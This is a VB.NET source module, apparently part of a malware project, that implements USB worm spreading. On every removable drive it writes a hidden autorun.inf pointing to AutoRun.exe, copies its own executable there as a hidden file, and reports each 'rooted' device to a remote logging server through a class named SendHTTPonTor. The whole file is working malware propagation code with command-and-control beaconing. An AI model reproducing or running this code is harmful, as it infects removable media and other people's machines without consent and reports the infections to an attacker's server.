Imports System.IO

Module USBSpread
    Public Sub USBSpreading(ByVal source As String)
        Dim http As New SendHTTPonTor
        Dim drives As DriveInfo() = DriveInfo.GetDrives()
        Try

            For Each drive As DriveInfo In drives

                If drive.DriveType = DriveType.Removable Then
                    Dim autorunPath As String = String.Concat(drive.Name, "autorun.inf")

                    Dim outfile As StreamWriter = New StreamWriter(autorunPath)

                    outfile.WriteLine("[autorun]")
                    outfile.WriteLine("open=AutoRun.exe")
                    outfile.WriteLine("action=Run VMCLite")
                    outfile.Close()


                    File.SetAttributes(autorunPath, FileAttributes.Hidden)

                    Try
                        File.Copy(source, String.Concat(drive.Name, "AutoRun.exe"), True)

                        File.SetAttributes(String.Concat(drive.Name, "AutoRun.exe"), FileAttributes.Hidden)
                        Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "Removable device is rooted.",
                            .Type = "Info"
                        }
                        http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                        If Config.Variables.Debug Then
                            Console.WriteLine("Removable device is rooted.")
                        End If
                    Finally

                    End Try
                End If
            Next

        Catch ex As Exception
            Dim log As New LogModel With {
                 .KeyUnique = GetConfigJson.KeyUnique,
                 .Message = "Exception: " & ex.ToString(),
                 .Type = "Error"
            }
            http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
        End Try
    End Sub
End Module
